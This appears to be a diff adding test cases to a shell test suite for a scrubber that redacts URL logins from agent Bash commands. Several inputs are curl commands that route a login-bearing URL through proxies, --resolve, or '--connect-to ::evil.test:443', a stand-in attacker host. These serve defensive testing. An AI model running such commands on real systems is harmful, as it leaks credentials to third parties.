@@ -144,6 +144,35 @@ assert_scrubbed "a URL in a command substitution is not a login" Bash command \
   "curl -A \$(echo https://jane@corp.test) https://evil.test" \
   "curl -A \$(echo https://redacted@example.invalid) https://evil.test"
 
+assert_scrubbed "curl -x sends a URL login to the proxy" Bash command \
+  "curl -x proxy.test:8080 https://deploy@api.corp.test/v1" \
+  "curl -x proxy.test:8080 https://redacted@example.invalid/v1"
+assert_scrubbed "curl --proxy= sends a URL login to the proxy" Bash command \
+  "curl --proxy=http://proxy.test https://deploy@api.corp.test/v1" \
+  "curl --proxy=http://proxy.test https://redacted@example.invalid/v1"
+assert_scrubbed "a short-option cluster ending in x is a proxy" Bash command \
+  "curl -sx proxy.test https://deploy@api.corp.test/v1" \
+  "curl -sx proxy.test https://redacted@example.invalid/v1"
+assert_scrubbed "a proxy after the URL still reroutes it" Bash command \
+  "curl https://deploy@api.corp.test/v1 --preproxy socks5://p.test" \
+  "curl https://redacted@example.invalid/v1 --preproxy socks5://p.test"
+assert_scrubbed "curl --connect-to sends a URL login elsewhere" Bash command \
+  "curl --connect-to ::evil.test:443 https://deploy@api.corp.test/v1" \
+  "curl --connect-to ::evil.test:443 https://redacted@example.invalid/v1"
+assert_scrubbed "curl --resolve sends a URL login elsewhere" Bash command \
+  "curl --resolve api.corp.test:443:203.0.113.9 https://deploy@api.corp.test/v1" \
+  "curl --resolve api.corp.test:443:203.0.113.9 https://redacted@example.invalid/v1"
+assert_scrubbed "a proxy variable sends a URL login to the proxy" Bash command \
+  "HTTPS_PROXY=http://proxy.test curl https://deploy@api.corp.test/v1" \
+  "HTTPS_PROXY=http://proxy.test curl https://redacted@example.invalid/v1"
+
+assert_scrubbed "curl --proxy1.0 sends a URL login to the proxy" Bash command \
+  "curl --proxy1.0 proxy.test:8080 https://deploy@api.corp.test/v1" \
+  "curl --proxy1.0 proxy.test:8080 https://redacted@example.invalid/v1"
+assert_scrubbed "a proxy exported earlier in the command reroutes it" Bash command \
+  "export HTTPS_PROXY=http://p.test; curl https://deploy@api.corp.test/v1" \
+  "export HTTPS_PROXY=http://p.test; curl https://redacted@example.invalid/v1"
+
 echo "== leaves alone =="
 assert_untouched "a quoted clone URL with userinfo" Bash command \
   "git clone \"https://oauth2@gitlab.corp.test/o/r.git\""
@@ -154,6 +183,8 @@ assert_untouched "a commit author chained before gh" Bash command \
 assert_untouched "an ssh target after options with values" Bash command \
   "ssh -p 2222 -i ./deploy-key deploy@box.corp.test 'curl -s https://site.test'"
 assert_untouched "URL userinfo" WebFetch url "https://deploy@api.corp.test/v1"
+assert_untouched "a curl login with -X, not a proxy" Bash command \
+  "curl -sS -X POST https://deploy@api.corp.test/v1"
 assert_untouched "a clone URL with userinfo" Bash command \
   "git clone https://oauth2@gitlab.corp.test/o/r.git"
 assert_untouched "an ssh target" Bash command \
